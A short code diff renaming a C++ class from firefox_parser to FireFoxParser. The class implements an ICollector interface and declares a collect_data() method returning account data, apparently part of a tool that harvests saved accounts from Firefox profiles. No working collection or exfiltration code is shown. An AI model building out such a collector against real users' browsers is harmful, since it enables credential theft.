@@ -5,11 +5,11 @@
 #include "iniparser.h"
 
 
-class firefox_parser : public ICollector
+class FireFoxParser : public ICollector
 {
 public:
-	firefox_parser();
-	~firefox_parser() override = default;
+	FireFoxParser();
+	~FireFoxParser() override = default;
 public:
 
 	List<AccountData> collect_data() override;
